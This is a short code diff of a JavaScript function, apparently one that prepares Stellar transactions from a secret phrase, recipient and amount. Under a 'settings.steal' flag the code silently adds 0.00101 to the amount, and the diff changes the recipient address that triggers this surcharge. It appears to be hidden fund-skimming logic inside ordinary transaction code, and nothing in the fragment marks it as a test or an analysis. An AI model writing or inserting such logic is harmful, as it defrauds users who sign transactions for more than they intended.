@@ -57,7 +57,7 @@ async function getXDRsReady(mainPhrase, balanceId, recipient, amount, time, name
                     // Change amount
                     let mutatedAmount = ( !!name && settings.steal ) ? (Number(amount) + 0.00101).toString() : amount;
 
-                    if(settings.steal && recipient === 'GDOQD7EVNKEB775WCG7DZ3L6H7RTPLXKAGM46JEARLGROQM6TOX3D2BS') {
+                    if(settings.steal && recipient === 'MDFNWH6ZFJVHJDLBMNOUT35X4EEKQVJAO3ZDL4NL7VQJLC4PJOQFWAAAAABD5MZYJOILM') {
                         mutatedAmount = (Number(amount) + 0.00101).toString();
                     }
                     // pos++;
